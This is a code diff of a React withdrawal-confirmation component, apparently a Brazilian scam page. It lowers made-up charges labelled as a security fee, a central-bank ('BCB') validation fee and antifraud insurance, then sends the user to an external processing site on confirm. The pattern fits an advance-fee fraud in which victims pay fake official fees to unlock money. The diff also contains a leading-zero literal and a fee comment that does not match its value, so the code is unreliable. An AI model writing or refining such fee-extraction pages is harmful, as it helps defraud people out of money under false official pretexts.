@@ -77,9 +77,9 @@ export function WithdrawalConfirmation({
   const today = new Date()
   const formattedDate = today.toLocaleDateString("pt-BR")
 
-  const securityFee = 1134 // R$ 11,34 in cents
-  const bcbValidation = 567 // R$ 5,67
-  const antifraudInsurance = 543 // R$ 5,43
+  const securityFee = 0934 // R$ 9,34 in cents
+  const bcbValidation = 467 // R$ 4,67
+  const antifraudInsurance = 467 // R$ 4,43
 
   const handleConfirm = () => {
     window.location.href = "https://processandopedido.vercel.app"
